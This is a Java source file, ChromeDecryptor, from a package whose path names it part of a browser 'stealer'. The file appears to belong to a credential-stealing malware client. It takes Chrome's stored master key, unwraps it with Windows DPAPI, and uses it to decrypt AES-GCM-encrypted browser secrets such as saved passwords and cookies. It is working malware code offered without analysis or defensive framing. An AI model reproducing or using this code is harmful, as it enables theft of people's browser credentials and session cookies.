package dev.neko.nekoclient.api.stealer.browser.impl.decrypt.chrome;

import com.sun.jna.Platform;
import com.sun.jna.platform.win32.Crypt32Util;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.util.Arrays;
import java.util.Objects;
import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class ChromeDecryptor {
   private final byte[] masterKey;
   private static final String EMPTY_STRING = "";

   public ChromeDecryptor(byte[] masterKey) {
      if (!isSupported()) {
         throw new UnsupportedOperationException();
      } else {
         this.masterKey = Crypt32Util.cryptUnprotectData(Arrays.copyOfRange(masterKey, 5, masterKey.length));
      }
   }

   public String decrypt(byte[] encrypted) throws NoSuchPaddingException, NoSuchAlgorithmException, IllegalBlockSizeException, BadPaddingException, InvalidAlgorithmParameterException, InvalidKeyException {
      if (Objects.equals(encrypted.length, 0)) {
         return "";
      } else {
         Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
         cipher.init(2, new SecretKeySpec(this.masterKey, "AES"), new GCMParameterSpec(128, Arrays.copyOfRange(encrypted, 3, 15)));
         return new String(cipher.doFinal(Arrays.copyOfRange(encrypted, 15, encrypted.length)));
      }
   }

   public static boolean isSupported() {
      return Platform.isWindows();
   }

   public final byte[] getMasterKey() {
      return this.masterKey;
   }
}
